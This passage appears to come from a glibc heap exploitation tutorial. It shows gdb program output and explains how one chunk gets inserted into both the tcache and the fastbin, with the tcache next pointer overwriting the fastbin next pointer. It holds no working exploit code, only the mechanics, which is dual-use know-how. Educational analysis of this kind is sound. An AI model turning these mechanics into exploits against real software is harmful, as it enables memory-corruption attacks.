Now by inserting it into the tcache too, we've changed the next ptr of the fastbin.
Depending on what happens, this can cause problems.
[Inferior 1 (process 6051) exited with code 064]
```

So, we see that the `0x555555559a30` chunk has been inserted into the tcache, and the fastbin. In addition to that, we see it looks like an additional chunk has been inserted into the fastbin. This is because when that chunk got inserted into the tcache, the fastbin next ptr got overwritten with the tcache next ptr, as part of the tcache insertion process.
